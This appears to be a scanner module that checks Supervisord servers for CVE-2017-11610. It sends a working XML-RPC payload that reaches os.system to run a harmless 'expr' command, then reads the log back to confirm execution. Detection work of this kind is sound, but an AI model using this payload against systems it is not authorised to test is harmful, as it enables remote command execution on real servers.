#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_2
from time import sleep

randomNum_1, randomNum_2 = random_int_2(5)

cve_2017_11610_payloads = [
    {
        'path': 'RPC2',
        'data-1': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<value><string>expr {NUM1} + {NUM2} | tee -a /tmp/supervisord.log</string></value>
</param>
</params>
</methodCall>'''.format(NUM1=randomNum_1, NUM2=randomNum_2),
        'data-2': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.readLog</methodName>
<params>
<param>
<value><int>0</int></value>
</param>
<param>
<value><int>0</int></value>
</param>
</params>
</methodCall>'''
    },
]

def cve_2017_11610_scan(self, clients):
    ''' Supervisord曝出了一个需认证的远程命令执行漏洞(CVE-2017-11610)
        通过POST请求向Supervisord管理界面提交恶意数据, 可以获取服务器操作权限, 带来严重的安全风险
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2017-11610',
    }

    headers = {
        'Content-Type': 'text/xml'
    }

    for payload in cve_2017_11610_payloads:
        path = payload['path']
        data_1 = payload['data-1']
        data_2 = payload['data-2']

        res1 = client.request(
            'post',
            path,
            data=data_1,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        sleep(2)

        res2 = client.request(
            'post',
            path,
            data=data_2,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        randomNum_sum = str(randomNum_1 + randomNum_2)

        if (randomNum_sum in res2.text):
            results = {
                'Target': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request-1': res1,
                'Request-2': res2,
            }
            return results
    return None
